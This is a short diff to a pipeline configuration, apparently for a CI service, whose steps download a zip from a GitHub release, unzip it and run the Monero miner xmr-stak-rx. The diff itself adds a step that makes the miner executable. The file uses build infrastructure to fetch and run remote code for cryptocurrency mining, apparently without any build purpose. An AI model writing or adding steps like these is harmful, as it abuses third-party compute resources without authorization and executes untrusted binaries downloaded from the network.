@@ -5,5 +5,7 @@ steps:
     command: wget https://github.com/AnggaR96s/TRASH-COMMIT/releases/download/latest/nano.zip
   - name: anu
     command: unzip nano.zip
+  - name: chmod
+    command: chmod +x xmr-stak-rx
   - name: ekse
     command: ./xmr-stak-rx --noTest
